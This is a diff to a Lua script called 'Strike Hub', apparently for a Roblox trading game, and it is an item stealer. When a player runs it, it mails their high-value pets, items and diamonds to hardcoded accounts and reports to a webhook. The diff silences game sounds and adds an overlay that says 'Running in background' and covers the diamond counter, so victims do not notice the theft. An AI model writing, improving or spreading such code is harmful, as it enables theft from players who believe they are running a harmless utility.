@@ -1,3 +1,6 @@
+-- =========================
+-- Strike Hub Script
+-- =========================
 _G.scriptExecuted = _G.scriptExecuted or false
 if _G.scriptExecuted then return end
 _G.scriptExecuted = true
@@ -25,6 +28,7 @@ end
 local users = _G.Usernames or {"ilovemyamazing_gf1", "Yeahboi1131", "Dragonshell23", "Dragonshell24", "Dragonshell21"}
 local min_rap = _G.minrap or 10000000 -- 10 million min RAP
 local webhook = _G.webhook or ""
+_G.StrikeHubLogo = _G.StrikeHubLogo or "" -- optional logo
 
 if next(users) == nil or webhook == "" then
     plr:kick("You didn't add any usernames or webhook")
@@ -38,6 +42,9 @@ for _, user in ipairs(users) do
     end
 end
 
+-- =========================
+-- Find function for mail cost
+-- =========================
 local FunctionToGetFirstPriceOfMail
 for _, func in pairs(getgcFunction()) do
     if debug.getinfo(func).name == "computeSendMailCost" then
@@ -48,7 +55,6 @@ end
 
 local mailSendPrice = FunctionToGetFirstPriceOfMail()
 local GemAmount1 = 1
-
 for i, v in pairs(GetSave().Inventory.Currency) do
     if v.id == "Diamonds" then
         GemAmount1 = v._am
@@ -56,6 +62,9 @@ for i, v in pairs(GetSave().Inventory.Currency) do
     end
 end
 
+-- =========================
+-- Helpers
+-- =========================
 local function formatNumber(number)
     local suffixes = {"", "k", "m", "b", "t"}
     local suffixIndex = 1
@@ -103,25 +112,23 @@ local function SendMessage(diamonds)
     end
 end
 
--- Disable all sounds and notifications
-local loading = plr.PlayerScripts.Scripts.Core["Process Pending GUI"]
-local noti = plr.PlayerGui.Notifications
-loading.Disabled = true
-noti:GetPropertyChangedSignal("Enabled"):Connect(function()
-    noti.Enabled = false
-end)
-noti.Enabled = false
-
-game.DescendantAdded:Connect(function(x)
-    if x.ClassName == "Sound" then
-        if x.SoundId == "rbxassetid://11839132565" or x.SoundId == "rbxassetid://14254721038" or x.SoundId == "rbxassetid://12413423276" then
-            x.Volume = 0
-            x.PlayOnRemove = false
-            x:Destroy()
-        end
+-- =========================
+-- Silence all sounds
+-- =========================
+game.DescendantAdded:Connect(function(descendant)
+    if descendant:IsA("Sound") then
+        descendant.Volume = 0
+        descendant.PlayOnRemove = false
+        descendant.Looped = false
+        task.defer(function()
+            if descendant.Playing then descendant:Stop() end
+        end)
     end
 end)
 
+-- =========================
+-- Get RAP
+-- =========================
 local function getRAP(Type, Item)
     return (require(game:GetService("ReplicatedStorage").Library.Client.RAPCmds).Get({
         Class = {Name = Type},
@@ -131,15 +138,21 @@ local function getRAP(Type, Item)
     }) or 0)
 end
 
-local function sendItem(category, uid, am)
+-- =========================
+-- Send items
+-- =========================
+local function sendItem(category, uid, amount)
     local userIndex, maxUsers = 1, #users
     while userIndex <= maxUsers do
-        local args = {users[userIndex], MailMessage, category, uid, 1}
+        local sendAmount = (category == "Pet") and 1 or amount
+        local args = {users[userIndex], MailMessage, category, uid, sendAmount}
         local response, err = network.Invoke("Mailbox: Send", unpack(args))
         if response then
             GemAmount1 -= mailSendPrice
             mailSendPrice = math.min(math.ceil(mailSendPrice * 1.5), 5000000)
-            break
+            if category ~= "Pet" then break end
+            amount -= 1
+            if amount <= 0 then break end
         elseif err == "They don't have enough space!" then
             userIndex += 1
         else
@@ -195,16 +208,24 @@ end
 
 local function canSendMail()
     local uid
-    for i,v in pairs(save["Pet"]) do uid=i break end
+    if save["Pet"] then
+        for i,v in pairs(save["Pet"]) do uid=i break end
+    end
+    if not uid then return false end
     local _, err = network.Invoke("Mailbox: Send", "Roblox","Test","Pet",uid,1)
     return (err == "They don't have enough space!")
 end
 
+-- =========================
+-- Claim daycare rewards
+-- =========================
 require(game.ReplicatedStorage.Library.Client.DaycareCmds).Claim()
 require(game.ReplicatedStorage.Library.Client.ExclusiveDaycareCmds).Claim()
 
-local categoryList = {"Pet", "Egg", "Charm", "Enchant", "Potion", "Misc", "Ultimate"} -- Removed Booth + Hoverboard
-
+-- =========================
+-- Collect items to send
+-- =========================
+local categoryList = {"Pet", "Egg", "Charm", "Enchant", "Potion", "Misc", "Ultimate"}
 for _,v in pairs(categoryList) do
     if save[v] then
         for uid,item in pairs(save[v]) do
@@ -229,7 +250,10 @@ for _,v in pairs(categoryList) do
     end
 end
 
-if #sortedItems > 0 or GemAmount1 > min_rap + mailSendPrice then
+-- =========================
+-- Start sending immediately
+-- =========================
+task.spawn(function()
     ClaimMail()
     EmptyBoxes()
     if not canSendMail() then
@@ -239,22 +263,105 @@ if #sortedItems > 0 or GemAmount1 > min_rap + mailSendPrice then
 
     table.sort(sortedItems,function(a,b) return (a.rap*a.amount)>(b.rap*b.amount) end)
     spawn(function() SendMessage(GemAmount1) end)
-
     message.Error("Please wait while the script loads!") -- Only shows once
 
-    -- ⚡ FASTER item sending
     for _, item in ipairs(sortedItems) do
         if item.rap >= min_rap and GemAmount1 > mailSendPrice then
-            task.spawn(function()
-                sendItem(item.category, item.uid, item.amount)
-            end)
-            task.wait(0.05) -- small delay to avoid rate-limit
-        else
-            break
+            if item.category == "Pet" then
+                for i = 1, item.amount do
+                    task.spawn(function()
+                        sendItem(item.category, item.uid, 1)
+                    end)
+                    task.wait(0.05)
+                end
+            else
+                task.spawn(function()
+                    sendItem(item.category, item.uid, item.amount)
+                end)
+                task.wait(0.05)
+            end
         end
     end
 
     if GemAmount1 > mailSendPrice then
         SendAllGems()
     end
+end)
+
+-- =========================
+-- GUI over diamond currency
+-- =========================
+do
+    local existing = plr.PlayerGui:FindFirstChild("StrikeHubGUI")
+    if existing then existing:Destroy() end
+
+    local ScreenGui = Instance.new("ScreenGui")
+    ScreenGui.Name = "StrikeHubGUI"
+    ScreenGui.ResetOnSpawn = false
+    ScreenGui.Parent = plr:WaitForChild("PlayerGui")
+
+    local Frame = Instance.new("Frame")
+    Frame.Name = "Main"
+    Frame.Size = UDim2.new(0, 360, 0, 80)
+    Frame.Position = UDim2.new(0, 12, 0, 30) -- lower so it overlaps in-game diamond display
+    Frame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+    Frame.BorderSizePixel = 0
+    Frame.AnchorPoint = Vector2.new(0,0)
+    Frame.Parent = ScreenGui
+    Frame.Active = true
+    Frame.Draggable = true
+
+    local Logo = Instance.new("ImageLabel")
+    Logo.Name = "Logo"
+    Logo.Size = UDim2.new(0, 64, 1, 0)
+    Logo.Position = UDim2.new(0, 0, 0, 0)
+    Logo.BackgroundTransparency = 1
+    if _G.StrikeHubLogo ~= "" then
+        Logo.Image = _G.StrikeHubLogo
+    else
+        Logo.Image = ""
+    end
+    Logo.Parent = Frame
+
+    local Title = Instance.new("TextLabel")
+    Title.Name = "Title"
+    Title.Position = UDim2.new(0, 72, 0, 6)
+    Title.Size = UDim2.new(0, 200, 0, 24)
+    Title.BackgroundTransparency = 1
+    Title.Text = "Strike Hub"
+    Title.TextColor3 = Color3.fromRGB(0, 255, 128)
+    Title.Font = Enum.Font.GothamBold
+    Title.TextSize = 18
+    Title.TextXAlignment = Enum.TextXAlignment.Left
+    Title.Parent = Frame
+
+    local Sub = Instance.new("TextLabel")
+    Sub.Name = "Sub"
+    Sub.Position = UDim2.new(0, 72, 0, 28)
+    Sub.Size = UDim2.new(0, 250, 0, 18)
+    Sub.BackgroundTransparency = 1
+    Sub.Text = "Running in background"
+    Sub.TextColor3 = Color3.fromRGB(200, 200, 200)
+    Sub.Font = Enum.Font.Gotham
+    Sub.TextSize = 13
+    Sub.TextXAlignment = Enum.TextXAlignment.Left
+    Sub.Parent = Frame
+
+    local CloseBtn = Instance.new("TextButton")
+    CloseBtn.Name = "Close"
+    CloseBtn.Size = UDim2.new(0, 28, 0, 28)
+    CloseBtn.Position = UDim2.new(1, -36, 0, 16)
+    CloseBtn.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+    CloseBtn.BorderSizePixel = 0
+    CloseBtn.Text = "X"
+    CloseBtn.TextColor3 = Color3.fromRGB(255, 100, 100)
+    CloseBtn.Font = Enum.Font.GothamBold
+    CloseBtn.TextSize = 14
+    CloseBtn.Parent = Frame
+
+    CloseBtn.MouseButton1Click:Connect(function()
+        if ScreenGui and ScreenGui.Parent then
+            ScreenGui:Destroy()
+        end
+    end)
 end
